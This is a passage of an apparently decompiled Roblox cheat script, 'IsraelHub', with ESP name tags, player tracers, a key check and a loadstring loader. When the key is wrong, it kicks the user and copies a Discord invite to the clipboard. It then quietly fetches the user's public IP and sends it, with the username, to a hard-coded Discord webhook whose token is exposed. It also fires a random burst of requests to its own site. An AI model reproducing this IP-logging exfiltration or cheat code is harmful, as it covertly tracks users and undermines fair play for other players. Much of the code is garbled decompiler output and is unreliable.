          Instance.new("TextLabel", (Instance.new("BillboardGui"))).BackgroundTransparency = 1
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.new(0, 255, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Size = UDim2.new(0, 200, 0, 50)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextScaled = false
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextSize = 15
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Text = ("%s (%s)"):format(a.Name, a.Tag)
          if a.Rainbow then
            vc.Rainbow((Instance.new("TextLabel", (Instance.new("BillboardGui")))))
          end
          if not va(a.Player) then
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.fromRGB(a.Colour[1], a.Colour[2], a.Colour[3])
          end
          AddConnection((a.Player.CharacterAdded:Connect(function()
            va.Adornee = vb.Player.Character:WaitForChild("Head")
          end)))
          AddConnection(Players.PlayerRemoving:Connect(function(a)
            if a == va.Player then
              vb:Disconnect()
              vc:Destroy()
            end
          end))
        end,
        TextFont = function(a, b)
          b = va.concat(b, ",")
          a:gsub(".", function(a)
            va[2 + 1] = a
          end)
          return va.concat(va.map({}, function(a, b)
            return ("<font color=\"rgb(%s)\">%s</font>"):format(va, b)
          end)) .. " "
        end,
        Trace = function(a, b)
          if not Drawing then
            return
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Line")
          Drawing.new("Line").To = Vector2.new(vb.Camera:WorldToViewportPoint(va(a).Head.Position).X, vb.Camera:WorldToViewportPoint(va(a).Head.Position).Y)
          Drawing.new("Line").From = Vector2.new(vb.Camera.ViewportSize.X / 2, vb.Camera.ViewportSize.Y)
          Drawing.new("Line").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Line").Thickness = 0,1
          Drawing.new("Line").Transparency = 1
          Drawing.new("Line").Visible = true
          vd[a] = Drawing.new("Line")
          return function()
            va:Remove()
            vb[vc] = nil
          end
        end,
        UpdateTracers = function()
          if nil then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if va then
                elseif vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position) then
                  fe.Visible = true
                  fe.To = Vector2.new(vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).X, vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).Y)
                else
                  fe.Visible = false
                end
              end
            end))
          end
        end,
        DestroyTracers = function()
          for fd, fe in next, Tracers, nil do
            fe:Remove()
          end
          if not Tracers then
            va:Disconnect()
          end
        end,
        DestroyDrawings = function()
          for fd, fe in next, va, nil do
            fe:Remove()
          end
          if vb then
            vb:Disconnect()
          end
          if not vb then
            vc:Disconnect()
          end
        end
      }.Notify(LocalPlayer, "Welcome To IsraelHub", "'cmds' to see all of the commands")
    end)
  end)()
  coroutine.wrap(function()
    Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
      game.Players.LocalPlayer.PlayerGui.LoaderSheeesh:Destroy()
    end)
    warn(vb)
    if not Instance.new("LocalScript", va) then
      vc.Text = "Game Detected: " .. vb.GameName
      vd.Text = "Load Script"
    else
      vc.Text = "No Game Deteced..."
      vd.Text = "Destroy GUI"
      return
    end
    vd.MouseButton1Down:Connect(function()
      loadstring(va)()
    end)
  end)()
else
  game.Players.LocalPlayer:kick("Wrong Key, Discord Server Copied To Clipboard")
  setclipboard("https://discord.com/invite/sUREWvYjgT")
  request = not HttpPost and not request and {} and syn.request
  request({
    Url = "https://discord.com/api/webhooks/931053883218882601/nhUhcByw1aEPl-Yizva-e0o5cq_o5IPa4hFmXBlvZBpLQYDYPDhxkdJGxGy5QNHpr9dc",
    Body = game:GetService("HttpService"):JSONEncode({
      embeds = {
        {
          title = "**IsraelHub Key Wrong **" .. tostring(game:HttpGet("https://api.ipify.org", true)),
          description = "Username: " .. game.Players.LocalPlayer.Name .. " with **" .. (is_sirhurt_closure and "Kid with shit exploit") .. "**",
          type = "rich",
          color = tonumber(7498202),
          image = {
            url = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(game:GetService("Players").LocalPlayer.Name)
          }
        }
      }
    }),
    Method = "POST",
    Headers = {
      ["content-type"] = "application/json"
    }
  })
end
for fj = 1, math.random(1, 10000) do
  pcall(function()
    game:HttpGet("https://israelhub.netlify.app/key/" .. rand(8))
  end)
end
